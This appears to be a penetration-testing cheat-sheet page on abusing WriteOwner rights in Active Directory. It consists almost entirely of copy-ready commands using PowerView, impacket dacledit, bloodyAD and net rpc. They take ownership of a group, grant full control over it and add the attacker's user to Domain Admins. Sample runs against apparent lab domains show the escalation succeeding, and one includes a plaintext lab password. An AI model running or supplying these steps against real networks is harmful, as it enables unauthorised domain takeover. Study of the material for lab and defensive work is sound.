---
title: "WriteOwner/Own"
date: 2024-7-27
tags: ["Writeowner", "Permissions", "Powerview", "Impacket", "AddMember", "Domain Controller", "Active Directory", "Windows", "Dacledit"]
---

### Abuse #1 : Change owner of the group

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> . .\PowerView.ps1
```

#### 2. Change owner

```console
Set-DomainObjectOwner -Identity '<GROUP>' -OwnerIdentity '<TARGET_USER>'
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> Set-DomainObjectOwner -Identity 'DOMAIN ADMINS' -OwnerIdentity 'maria'
```

{{< /tabcontent >}}

### Abuse #2 : Add user to the group

{{< tab set2 tab1 active >}}Linux{{< /tab >}}{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{<  tabcontent set2 tab1  >}}

#### 1. Add full control permission to the user over the group

{{< tab set2-1 tab1 active >}}impacket{{< /tab >}}{{< tab set2-1 tab2 >}}bloodyAD{{< /tab >}}
{{< tabcontent set2-1 tab1 >}}

```console
# Install latest impacket (included dacledit.py)
git clone https://github.com/fortra/impacket.git
```

```console
cd impacket
```

```console
pip3 install .
```

<br>

```console
sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal '<USER>' -target '<GROUP>' -inheritance -action write -rights FullControl
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.absolute.htb && dacledit.py -k 'absolute.htb/m.lovegod:AbsoluteLDAP2022!' -dc-ip dc.absolute.htb -principal 'm.lovegod' -target 'NETWORK AUDIT' -inheritance -action write -rights FullControl
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20240924-021507.bak
[*] DACL modified successfully!
```

{{< /tabcontent >}}
{{< tabcontent set2-1 tab2 >}}

```console
# With Kerberos
python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ python3 bloodyAD.py -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add genericAll 'NETWORK AUDIT' 'm.lovegod' 
[+] m.lovegod has now GenericAll on NETWORK AUDIT
```

{{< /tabcontent >}}

#### 2. Add the user to group

{{< tab set2-2 tab1 active >}}bloodyAD{{< /tab >}}{{< tab set2-2 tab2 >}}rpc{{< /tab >}}
{{< tabcontent set2-2 tab1 >}}

```console
python3 bloodyAD.py -k -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ python3 bloodyAD.py -k -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' --host dc.absolute.htb add groupMember 'NETWORK AUDIT' 'm.lovegod'
[+] m.lovegod added to NETWORK AUDIT
```

{{< /tabcontent >}}
{{< tabcontent set2-2 tab2 >}}

```console
# Request a TGT
sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.absolute.htb && impacket-getTGT 'absolute.htb/m.lovegod'                                                                  
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in m.lovegod.ccache
```

```console
export KRB5CCNAME=<USER>.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=m.lovegod.ccache
```

```console
sudo ntpdate -s <DC> && net rpc group addmem '<GROUP>' '<USER>' -U '<USER>' --use-kerberos=required -S <DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.absolute.htb && net rpc group addmem 'NETWORK AUDIT' 'm.lovegod' -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
Password for [WORKGROUP\m.lovegod]:
```

{{< /tabcontent >}}

#### 3. Check

```console
sudo ntpdate -s <DC> && net rpc group members '<GROUP>' -U '<USER>' --use-kerberos=required -S <DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.absolute.htb && net rpc group members 'NETWORK AUDIT' -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
Password for [WORKGROUP\m.lovegod]:
absolute\m.lovegod
absolute\svc_audit
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. Import PowerView.ps1 

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> . .\PowerView.ps1
```

#### 2. Create a cred object (runas) \[optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add user to group

```console
Add-DomainObjectAcl -TargetIdentity '<GROUP>' -PrincipalIdentity '<USER>' -Rights All -DomainController <DC> -Credential $cred
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> Add-DomainObjectAcl -TargetIdentity 'DOMAIN ADMINS' -PrincipalIdentity 'maria' -Rights All -DomainController jenkins.object.local
```

```console
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential $cred
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
```

#### 4. Check

```console
Get-DomainGroupMember -Identity '<GROUP>' -Domain <DOMAIN> -DomainController <DC> -Credential $cred | fl MemberName
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> Get-DomainGroupMember -Identity 'DOMAIN ADMINS' -Domain object.local -DomainController jenkins.object.local | fl MemberName

MemberName : maria

MemberName : Administrator
```

```console
# Or
net user <USER>
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> net user maria
User name                    maria
Full Name                    maria garcia
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/21/2021 9:16:33 PM
Password expires             Never
Password changeable          10/22/2021 9:16:33 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/23/2024 2:24:00 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Admins        *Domain Users
The command completed successfully.
```

```console
# Exit current sessions or re-login
whoami /groups
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                    Type             SID                                           Attributes
============================================= ================ ============================================= ===============================================================
Everyone                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users               Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                        Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                          Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
OBJECT\Domain Admins                          Group            S-1-5-21-4088429403-1159899800-2753317549-512 Mandatory group, Enabled by default, Enabled group
OBJECT\Denied RODC Password Replication Group Alias            S-1-5-21-4088429403-1159899800-2753317549-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication              Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level          Label            S-1-16-12288
```

{{< /tabcontent >}}
